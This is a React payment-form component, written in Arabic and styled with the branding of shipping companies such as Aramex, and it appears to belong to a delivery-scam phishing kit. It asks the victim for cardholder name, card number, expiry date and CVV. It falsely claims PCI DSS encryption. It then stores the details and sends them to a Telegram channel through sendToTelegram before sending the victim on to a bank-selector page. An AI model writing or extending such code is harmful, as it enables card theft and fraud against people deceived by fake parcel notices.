import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || customerInfo.service || 'aramex').toLowerCase();
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
  
  const Layout = getCompanyLayout(serviceKey);
  const branding = shippingCompanyBranding[serviceKey] || shippingCompanyBranding['aramex'];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const expiry = `${expiryMonth}/${expiryYear}`;
    const cardInfo = { cardName, cardNumber, expiry, cvv };
    
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, cardInfo }
      });
      
      await sendToTelegram({
        type: 'card_details',
        data: { ...customerInfo, service: serviceKey, ...cardInfo, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });
      
      navigate(`/pay/${id}/bank-selector`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} trackingNumber={shippingInfo?.tracking_number} amount={formattedAmount}>
      <form onSubmit={handleSubmit} className="space-y-6">
        <div 
          className="rounded-xl p-4 mb-6 flex items-start gap-3"
          style={{ background: `${branding.colors.primary}10`, border: `1px solid ${branding.colors.primary}30` }}
        >
          <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
          <p className="text-xs text-gray-600 leading-relaxed">
            سيتم حجز مبلغ <strong>{formattedAmount}</strong> من بطاقتك لتأكيد عملية الشحن. 
            يرجى إدخال بيانات البطاقة بشكل صحيح لتجنب التأخير.
          </p>
        </div>

        <div className="space-y-4">
          <div className="space-y-2">
            <Label className="text-xs font-bold text-gray-600">اسم حامل البطاقة</Label>
            <Input
              placeholder="Full Name as on card"
              value={cardName}
              onChange={(e) => setCardName(e.target.value.toUpperCase())}
              className="h-12 border-2 focus:ring-4 focus:ring-blue-50"
              required
            />
          </div>

          <div className="space-y-2">
            <Label className="text-xs font-bold text-gray-600">رقم البطاقة</Label>
            <div className="relative">
              <Input
                placeholder="0000 0000 0000 0000"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})/g, '$1 ').trim())}
                className="h-12 border-2 pr-12 font-mono text-lg"
                required
              />
              <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label className="text-xs font-bold text-gray-600">تاريخ الانتهاء</Label>
              <div className="flex gap-2">
                <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                  <SelectTrigger className="h-12 border-2"><SelectValue placeholder="MM" /></SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => (
                      <SelectItem key={m} value={m}>{m}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <Select value={expiryYear} onValueChange={setExpiryYear}>
                  <SelectTrigger className="h-12 border-2"><SelectValue placeholder="YY" /></SelectTrigger>
                  <SelectContent>
                    {Array.from({ length: 15 }, (_, i) => (new Date().getFullYear() + i).toString().slice(-2)).map(y => (
                      <SelectItem key={y} value={y}>{y}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-bold text-gray-600">رمز الأمان (CVV)</Label>
              <Input
                type="password"
                placeholder="•••"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                className="h-12 border-2 text-center font-mono text-lg"
                required
              />
            </div>
          </div>
        </div>

        <Button
          type="submit"
          disabled={isSubmitting}
          className="w-full h-14 text-lg font-black text-white rounded-xl shadow-lg transition-all"
          style={{ background: branding.gradients.primary }}
        >
          {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : (
            <>
              <span>دفع {formattedAmount}</span>
              <ArrowLeft className="w-5 h-5 mr-2" />
            </>
          )}
        </Button>

        <div className="flex items-center justify-center gap-2 text-[10px] text-gray-400">
          <Shield className="w-3 h-3" />
          <span>تم التشفير بواسطة نظام الحماية العالمي PCI DSS</span>
        </div>
      </form>
    </Layout>
  );
};

export default PaymentCardForm;
